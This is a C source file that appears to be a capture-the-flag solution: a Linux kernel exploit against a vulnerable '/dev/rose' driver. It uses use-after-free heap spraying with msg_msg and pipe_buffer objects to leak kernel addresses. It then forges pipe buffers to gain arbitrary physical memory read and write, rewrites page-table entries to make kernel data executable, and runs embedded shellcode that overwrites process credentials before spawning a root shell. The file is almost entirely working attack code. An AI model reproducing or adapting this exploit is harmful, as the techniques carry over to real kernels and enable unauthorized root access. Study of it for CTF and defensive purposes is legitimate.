// gcc exploit.c -o exploit
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/xattr.h>
#include <sys/prctl.h>

static void dump(void *buf, size_t size);

#define PAGE_SIZE (1<<12)
#define MSGMSG_HEADER_SIZE 0x30UL

struct pipe_buffer {
	uintptr_t page;
	unsigned int offset, len;
	uintptr_t ops;
	unsigned int flags;
	unsigned long private;
};

struct pipe_pair {
    union {
        struct {
            int out;
            int in;
        };
        int __raw[2];
    };
};

int main(int argc, char *argv[]){
	int rose_fds[3];
	struct pipe_pair pipe_fd;
	char msg_buf[PAGE_SIZE - MSGMSG_HEADER_SIZE + 0x400];
	char buf[PAGE_SIZE] = {};

	for(int i=0; i<3; i++)
		if((rose_fds[i] = open("/dev/rose", O_RDWR)) < 0){
			perror("/dev/rose");
			return -1;
		}
	close(rose_fds[0]);

  	int qid = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
	memset(msg_buf, 0x41, sizeof(msg_buf));
	msgsnd(qid, msg_buf, sizeof(msg_buf)-8, 0);

	close(rose_fds[1]);

	pipe(pipe_fd.__raw);
	write(pipe_fd.in, buf, sizeof(buf)); // 0

	close(rose_fds[2]);

	pipe((int[]){0,0});
	write(pipe_fd.in, buf, sizeof(buf)); // 1
	msgrcv(qid, msg_buf, sizeof(msg_buf)-8, 0, MSG_NOERROR);

	struct pipe_buffer *pipe_buff = (void*)msg_buf + PAGE_SIZE - MSGMSG_HEADER_SIZE;
	//dump(pipe_buff, 0x200);
	uintptr_t vaddr_page_base = pipe_buff[1].page & ~((1<<24)-1) ;
	uintptr_t vaddr_anon_pipe_buf_ops = pipe_buff[1].ops;
	uintptr_t vaddr_kernel_rodata = vaddr_anon_pipe_buf_ops - 0x1df80;
	uintptr_t vaddr_kernel_data   = vaddr_kernel_rodata + 0x600000;
	printf("[+] vaddr_page_base		= %p\n", (void*)vaddr_page_base);
	printf("[+] vaddr_kernel_rodata 	= %p\n", (void*)vaddr_kernel_rodata);
	printf("[+] vaddr_kernel_data   	= %p\n", (void*)vaddr_kernel_data);

	ssize_t apar(uintptr_t paddr, int idx, void *p, size_t size, uint64_t fops){
		pipe_buff[idx] = (struct pipe_buffer){
			.page    = vaddr_page_base + (paddr>>6),
			.offset  = 0,
			.len     = 0x1000,
			.ops     = fops ?: vaddr_anon_pipe_buf_ops,
			.flags   = 0x10,
			.private = 0,
		};
		setxattr("/tmp", "x", pipe_buff, 0x400, XATTR_CREATE);

		return read(pipe_fd.out, p, size);
	}

	ssize_t apaw(uintptr_t paddr, int idx, void *p, size_t size, uint64_t fops){
		pipe_buff[idx] = (struct pipe_buffer){
			.page    = vaddr_page_base + (paddr>>6),
			.offset  = 0,
			.len     = 0,
			.ops     = fops ?: vaddr_anon_pipe_buf_ops,
			.flags   = 0x10,
			.private = 0,
		};
		setxattr("/tmp", "x", pipe_buff, 0x400, XATTR_CREATE);

		return write(pipe_fd.in, p, size);
	}

	const uintptr_t paddr_pml4 = 0x9c000;

	apar(paddr_pml4, 0, buf, sizeof(buf), 0);
	uint64_t paddr_pdpt_data = ((uint64_t*)buf)[vaddr_kernel_data >> 39 & ((1<<9)-1)] & ~((1<<12)-1) & ~(1UL<<63);
	printf("[+] paddr_pdpt_data		= %p\n", (void*)paddr_pdpt_data);

	apar(paddr_pdpt_data, 1, buf, sizeof(buf)-1, 0);
	uint64_t paddr_pd_data = ((uint64_t*)buf)[vaddr_kernel_data >> 30 & ((1<<9)-1)] & ~((1<<12)-1) & ~(1UL<<63);
	printf("[+] paddr_pd_data   		= %p\n", (void*)paddr_pd_data);

	puts("Use new pipe");

	for(int i=0; i<2; i++)
		if((rose_fds[i] = open("/dev/rose", O_RDWR)) < 0){
			perror("/dev/rose");
			return -1;
		}
	close(rose_fds[0]);

	pipe(pipe_fd.__raw);

	write(pipe_fd.in, buf, sizeof(buf)); // 0
	write(pipe_fd.in, buf, 0x10); // 1

	close(rose_fds[1]);

	apar(paddr_pd_data, 0, buf, sizeof(buf), 0);
	uint64_t ent = ((uint64_t*)buf)[vaddr_kernel_data >> 21 & ((1<<9)-1)];
	if(!(ent & (1<<7))){
		printf("[-] not HugePage");
		return -1;
	}

	uint64_t paddr_kernel_data = ent & ~((1<<12)-1) & ~(1UL<<63);
	printf("[+] paddr_kernel_data  		= %p\n", (void*)paddr_kernel_data);

	// .offset  = (vaddr_kernel_data >> 21 & ((1<<9)-1)) << 3,
	// write(pipe_fd[1], (uint64_t[]){paddr_kernel_data | 0xe3, (paddr_kernel_data+0x2000) | 0xe3, (paddr_kernel_data+0x4000) | 0xe3}, sizeof(uint64_t)*3);
	((uint64_t*)buf)[vaddr_kernel_data >> 21 & ((1<<9)-1)]   = paddr_kernel_data | 0xe3; // make kernel data RWX
	apaw(paddr_pd_data, 1, buf, sizeof(buf), 0);

	uintptr_t ops[4] = {vaddr_kernel_data + 0x20, 0xcafebabe, 0xc0bebeef, 0};
	apaw(paddr_kernel_data, 2, ops, sizeof(ops), vaddr_kernel_data);

	/* thx ptr-yudai's shellcode */
	prctl(PR_SET_NAME, "shift_crops", 0, 0, 0);
	char shellcode[] = {
  0x41, 0xb8, 0x6f, 0x70, 0x73, 0x00, 0x48, 0xba, 0x73, 0x68, 0x69, 0x66, 0x74, 0x5f, 0x63, 0x72, 0x4c, 0x89, 0xe1, 0x48, 0x39, 0x51, 0x08, 0x74, 0x06, 0x48, 0x83, 0xc1, 0x10, 0xeb, 0xf4, 0x4c, 0x39, 0x41, 0x10, 0x74, 0x06, 0x48, 0x83, 0xc1, 0x10, 0xeb, 0xe8, 0x48, 0x81, 0xe9, 0x70, 0x03, 0x00, 0x00, 0x48, 0x81, 0xc1, 0xa8, 0x04, 0x00, 0x00, 0x48, 0x8b, 0x01, 0x31, 0xd2, 0x89, 0x10, 0x89, 0x50, 0x50, 0x89, 0x50, 0x54, 0x89, 0x50, 0x60, 0x89, 0x90, 0x80, 0x00, 0x00, 0x00, 0x89, 0x90, 0x84, 0x00, 0x00, 0x00, 0x89, 0x90, 0x88, 0x00, 0x00, 0x00, 0x89, 0x90, 0x90, 0x00, 0x00, 0x00, 0xc3
};
	write(pipe_fd.in, shellcode, sizeof(shellcode));

	// trigger
	read(pipe_fd.out, buf, sizeof(buf));

	// not to close pipes
	// hitcon{The_right_way_of_pronouncing_pipe_is_pee_pay---Inugami_Korone}
	execve("/bin/sh", (char *[]){"sh", NULL}, NULL);

	puts("fail");
	return -1;
}

static void dump(void *buf, size_t size){
	uint64_t *p = buf;

	printf("=== DUMP (%p-%p) ===\n", buf, buf+size);
	for(uint64_t i=0; i<size/8; i++){
		printf("%016lx ", p[i]);
		if(i%4 == 3)
			printf("\n");
	}
	printf("\n");
}
